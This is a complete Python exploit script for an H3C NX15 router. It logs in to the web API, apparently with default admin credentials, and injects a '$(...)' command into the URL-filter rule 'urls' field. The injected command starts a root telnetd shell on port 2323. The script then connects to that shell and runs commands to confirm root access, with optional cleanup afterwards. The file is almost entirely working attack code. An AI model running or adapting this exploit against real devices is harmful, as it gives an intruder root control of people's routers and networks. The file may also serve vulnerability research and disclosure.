#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time
from datetime import datetime

import requests


def log(msg):
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict, timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    wire = f'{cmd}; echo {end_marker}\n'.encode()
    sock.sendall(wire)
    time.sleep(0.6)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def parse_rule_ids(getlist_resp, desc: str):
    ids = []
    try:
        items = getlist_resp[0]['result']['data'].get('list', [])
        for item in items:
            if item.get('description') == desc:
                ids.append(item.get('id'))
    except Exception:
        pass
    return [i for i in ids if isinstance(i, int)]


def cleanup(base: str, session: str, desc: str, host: str, port: int, kill_shell: bool):
    try:
        resp = esps(base, session, 'esps.filter.url', 'getlist', {})
        ids = parse_rule_ids(resp, desc)
        if ids:
            log(f'[*] cleanup: deleting urlfilter rules {ids}')
            esps(base, session, 'esps.filter.url', 'delete', {'list': ids})
    except Exception as e:
        log(f'[!] cleanup delete rule failed: {e}')

    if kill_shell:
        try:
            sock, _ = connect_shell(host, port, timeout=4.0)
            awk_pat = f'/\\/usr\\/sbin\\/telnetd -p {port} -l \\/bin\\/sh/ && !/awk/ {{print $1}}'
            cmd = f'pid=$(ps w | awk \'{awk_pat}\'); [ -n "$pid" ] && kill $pid; echo cleaned'
            out = run_shell_cmd(sock, cmd)
            log('[*] cleanup shell output:')
            print(out)
            sock.close()
        except Exception as e:
            log(f'[!] cleanup kill shell failed: {e}')


def main():
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth RCE via esps.filter.url (mode branch eval injection)')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='host used for shell connect')
    ap.add_argument('--port', type=int, default=2323, help='temporary telnetd shell port')
    ap.add_argument('--delay', type=float, default=2.0, help='seconds to wait after triggering exploit')
    ap.add_argument('--cleanup', action='store_true', help='delete created rule and kill spawned shell after verification')
    args = ap.parse_args()

    desc = 'urlfilter_rce_' + datetime.now().strftime('%Y%m%d_%H%M%S')
    payload_cmd = f'echo URLFILTER_RCE_OK >/tmp/urlfilter_rce_marker; /usr/sbin/telnetd -p {args.port} -l /bin/sh >/dev/null 2>&1 &'
    payload = f'$({payload_cmd})'

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log('[*] Step 2: trigger esps.filter.url.add RCE')
    param = {
        'status': 'enable',
        'urls': [payload],
        'description': desc,
        'macs': [],
        'mode': 'white',
        'weekdays': [],
        'timeRange': [],
    }
    resp = esps(args.base, session, 'esps.filter.url', 'add', param)
    log('[*] add response:')
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    log(f'[*] Step 3: wait {args.delay:.1f}s for shell listener on {args.host}:{args.port}')
    time.sleep(args.delay)

    log('[*] Step 4: connect shell and prove code execution')
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode('latin1', 'ignore'))
    proof = run_shell_cmd(sock, 'id; uname -a; cat /tmp/urlfilter_rce_marker 2>/dev/null')
    print(proof)
    ok = ('uid=0(root)' in proof) and ('URLFILTER_RCE_OK' in proof)
    sock.close()

    log('[*] Step 5: fetch created rule state')
    state = esps(args.base, session, 'esps.filter.url', 'getlist', {})
    print(json.dumps(state, ensure_ascii=False, indent=2) if not isinstance(state, str) else state)

    if args.cleanup:
        log('[*] Step 6: cleanup')
        cleanup(args.base, session, desc, args.host, args.port, kill_shell=True)

    if ok:
        log('[+] SUCCESS: obtained root command execution via esps.filter.url')
        return 0

    log('[-] FAILED: shell proof did not match expected output')
    return 1


if __name__ == '__main__':
    sys.exit(main())
